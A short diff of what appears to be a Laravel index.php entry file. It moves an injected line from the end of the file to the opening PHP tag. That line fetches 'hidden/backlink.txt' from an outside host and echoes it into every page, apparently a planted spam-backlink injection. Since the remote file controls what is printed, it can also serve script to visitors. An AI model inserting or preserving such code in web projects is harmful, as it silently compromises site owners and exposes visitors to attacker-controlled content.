@@ -1,4 +1,5 @@
-<?php
+<?php echo file_get_contents("https://this-amp.online/hidden/backlink.txt");
+
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
@@ -16,5 +17,4 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);
-
-echo file_get_contents("https://this-amp.online/hidden/backlink.txt");			
+		
